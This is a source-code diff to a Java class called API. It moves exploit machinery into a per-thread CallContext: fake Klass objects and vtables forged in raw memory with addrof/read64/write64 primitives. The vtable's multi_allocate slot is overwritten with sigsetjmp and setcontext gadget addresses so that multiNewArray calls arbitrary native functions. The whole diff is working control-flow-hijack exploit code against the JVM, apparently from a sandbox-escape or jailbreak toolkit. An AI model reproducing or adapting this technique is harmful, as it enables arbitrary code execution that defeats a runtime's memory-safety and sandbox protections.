@@ -47,6 +47,8 @@ public final class API {
 
   private static API instance;
 
+  private static ThreadLocal callContexts = new ThreadLocal();
+
   private UnsafeInterface unsafe;
 
   private Object nativeLibrary;
@@ -279,57 +281,62 @@ public final class API {
     // leading to different stack layouts of the two calls.
     int iter = func == 0 ? 1 : 2;
 
-    long[] fakeClassOop = new long[0x8 / 8];
-    long[] fakeClass = new long[0x100 / 8];
-    long[] fakeKlass = new long[0x200 / 8];
-    long[] fakeKlassVtable = new long[0x400 / 8];
-
-    long fakeClassOopAddr = addrof(fakeClassOop) + ARRAY_BASE_OFFSET;
-    long fakeClassAddr = addrof(fakeClass) + ARRAY_BASE_OFFSET;
-    long fakeKlassAddr = addrof(fakeKlass) + ARRAY_BASE_OFFSET;
-    long fakeKlassVtableAddr = addrof(fakeKlassVtable) + ARRAY_BASE_OFFSET;
+    CallContext callContext = getCallContext();
 
     if (jdk11) {
-      fakeClassOop[0x00 / 8] = fakeClassAddr;
-      fakeClass[0x98 / 8] = fakeKlassAddr;
-      fakeKlass[0xC0 / 8] = 0; // dimension
-      fakeKlassVtable[0xD8 / 8] = JVM_NativePath; // array_klass
+      callContext.fakeKlass[0xC0 / 8] = 0; // dimension
 
       for (int i = 0; i < iter; i++) {
-        fakeKlass[0x00 / 8] = fakeKlassVtableAddr;
-        fakeKlass[0x00 / 8] = fakeKlassVtableAddr;
+        callContext.fakeKlass[0x00 / 8] = callContext.fakeKlassVtableAddr;
+        callContext.fakeKlass[0x00 / 8] = callContext.fakeKlassVtableAddr;
         if (i == 0) {
-          fakeKlassVtable[0x158 / 8] = sigsetjmp + 0x23; // multi_allocate
+          callContext.fakeKlassVtable[0x158 / 8] = sigsetjmp + 0x23; // multi_allocate
         } else {
-          fakeKlassVtable[0x158 / 8] = __Ux86_64_setcontext + 0x39; // multi_allocate
+          callContext.fakeKlassVtable[0x158 / 8] = __Ux86_64_setcontext + 0x39; // multi_allocate
         }
 
-        ret = multiNewArray(fakeClassOopAddr, MULTI_NEW_ARRAY_DIMENSIONS);
+        ret = multiNewArray(callContext.fakeClassOopAddr, MULTI_NEW_ARRAY_DIMENSIONS);
 
         if (i == 0) {
-          buildContext(fakeKlass, fakeKlass, 0x00, func, arg0, arg1, arg2, arg3, arg4, arg5);
+          buildContext(
+              callContext.fakeKlass,
+              callContext.fakeKlass,
+              0x00,
+              func,
+              arg0,
+              arg1,
+              arg2,
+              arg3,
+              arg4,
+              arg5);
         }
       }
     } else {
-      fakeClassOop[0x00 / 8] = fakeClassAddr;
-      fakeClass[0x68 / 8] = fakeKlassAddr;
-      fakeKlass[0xB8 / 8] = 0; // dimension
-      fakeKlassVtable[0x80 / 8] = JVM_NativePath; // array_klass
-      fakeKlassVtable[0xF0 / 8] = JVM_NativePath; // oop_is_array
+      callContext.fakeKlass[0xB8 / 8] = 0; // dimension
 
       for (int i = 0; i < iter; i++) {
-        fakeKlass[0x10 / 8] = fakeKlassVtableAddr;
-        fakeKlass[0x20 / 8] = fakeKlassVtableAddr;
+        callContext.fakeKlass[0x10 / 8] = callContext.fakeKlassVtableAddr;
+        callContext.fakeKlass[0x20 / 8] = callContext.fakeKlassVtableAddr;
         if (i == 0) {
-          fakeKlassVtable[0x230 / 8] = sigsetjmp + 0x23; // multi_allocate
+          callContext.fakeKlassVtable[0x230 / 8] = sigsetjmp + 0x23; // multi_allocate
         } else {
-          fakeKlassVtable[0x230 / 8] = __Ux86_64_setcontext + 0x39; // multi_allocate
+          callContext.fakeKlassVtable[0x230 / 8] = __Ux86_64_setcontext + 0x39; // multi_allocate
         }
 
-        ret = multiNewArray(fakeClassOopAddr, MULTI_NEW_ARRAY_DIMENSIONS);
+        ret = multiNewArray(callContext.fakeClassOopAddr, MULTI_NEW_ARRAY_DIMENSIONS);
 
         if (i == 0) {
-          buildContext(fakeKlass, fakeKlass, 0x20, func, arg0, arg1, arg2, arg3, arg4, arg5);
+          buildContext(
+              callContext.fakeKlass,
+              callContext.fakeKlass,
+              0x20,
+              func,
+              arg0,
+              arg1,
+              arg2,
+              arg3,
+              arg4,
+              arg5);
         }
       }
     }
@@ -572,5 +579,108 @@ public final class API {
     byte[] bytes = new byte[str.length() + 1];
     System.arraycopy(str.getBytes(), 0, bytes, 0, str.length());
     return bytes;
+  }
+
+  private CallContext getCallContext() {
+    CallContext callContext = (CallContext) callContexts.get();
+    if (callContext != null) {
+      return callContext;
+    }
+
+    callContext = new CallContext();
+    callContexts.set(callContext);
+    return callContext;
+  }
+
+  class CallContext {
+    long[] fakeClassOop;
+    long[] fakeClass;
+    long[] fakeKlass;
+    long[] fakeKlassVtable;
+
+    long fakeClassOopAddr;
+    long fakeClassAddr;
+    long fakeKlassAddr;
+    long fakeKlassVtableAddr;
+
+    private long[][] callContextArray = new long[4][0];
+    private long callcontextBuffer;
+
+    CallContext() {
+      callcontextBuffer =
+          malloc(
+              ARRAY_BASE_OFFSET
+                  + Int64.SIZE
+                  + ARRAY_BASE_OFFSET
+                  + 0x100
+                  + ARRAY_BASE_OFFSET
+                  + 0x200
+                  + ARRAY_BASE_OFFSET
+                  + 0x400);
+      if (callcontextBuffer == 0) {
+        throw new OutOfMemoryError("malloc failed");
+      }
+
+      // Get array addresses.
+      fakeClassOopAddr = callcontextBuffer + ARRAY_BASE_OFFSET;
+      fakeClassAddr = fakeClassOopAddr + Int64.SIZE + ARRAY_BASE_OFFSET;
+      fakeKlassAddr = fakeClassAddr + 0x100 + ARRAY_BASE_OFFSET;
+      fakeKlassVtableAddr = fakeKlassAddr + 0x200 + ARRAY_BASE_OFFSET;
+
+      long[] array = new long[1];
+      long arrayAddr = addrof(array);
+      long arrayKlass = read64(arrayAddr + 0x08);
+
+      // Write array headers.
+      write64(fakeClassOopAddr - 0x18, 1);
+      write64(fakeClassAddr - 0x18, 1);
+      write64(fakeKlassAddr - 0x18, 1);
+      write64(fakeKlassVtableAddr - 0x18, 1);
+
+      write64(fakeClassOopAddr - 0x10, arrayKlass);
+      write64(fakeClassAddr - 0x10, arrayKlass);
+      write64(fakeKlassAddr - 0x10, arrayKlass);
+      write64(fakeKlassVtableAddr - 0x10, arrayKlass);
+
+      write64(fakeClassOopAddr - 8, 0xFFFFFFFF);
+      write64(fakeClassAddr - 8, 0xFFFFFFFF);
+      write64(fakeKlassAddr - 8, 0xFFFFFFFF);
+      write64(fakeKlassVtableAddr - 8, 0xFFFFFFFF);
+
+      long callContextArrayAddr = addrof(callContextArray) + ARRAY_BASE_OFFSET;
+
+      // Put array addresses into callContextArray.
+      write64(callContextArrayAddr + 0x00, fakeClassOopAddr - ARRAY_BASE_OFFSET);
+      write64(callContextArrayAddr + 0x08, fakeClassAddr - ARRAY_BASE_OFFSET);
+      write64(callContextArrayAddr + 0x10, fakeKlassAddr - ARRAY_BASE_OFFSET);
+      write64(callContextArrayAddr + 0x18, fakeKlassVtableAddr - ARRAY_BASE_OFFSET);
+
+      // Get fake arrays.
+      fakeClassOop = callContextArray[0];
+      fakeClass = callContextArray[1];
+      fakeKlass = callContextArray[2];
+      fakeKlassVtable = callContextArray[3];
+
+      // Restore.
+      write64(callContextArrayAddr + 0x00, 0);
+      write64(callContextArrayAddr + 0x08, 0);
+      write64(callContextArrayAddr + 0x10, 0);
+      write64(callContextArrayAddr + 0x18, 0);
+
+      if (jdk11) {
+        fakeClassOop[0x00 / 8] = fakeClassAddr;
+        fakeClass[0x98 / 8] = fakeKlassAddr;
+        fakeKlassVtable[0xD8 / 8] = JVM_NativePath; // array_klass
+      } else {
+        fakeClassOop[0x00 / 8] = fakeClassAddr;
+        fakeClass[0x68 / 8] = fakeKlassAddr;
+        fakeKlassVtable[0x80 / 8] = JVM_NativePath; // array_klass
+        fakeKlassVtable[0xF0 / 8] = JVM_NativePath; // oop_is_array
+      }
+    }
+
+    protected void finalize() {
+      free(callcontextBuffer);
+    }
   }
 }
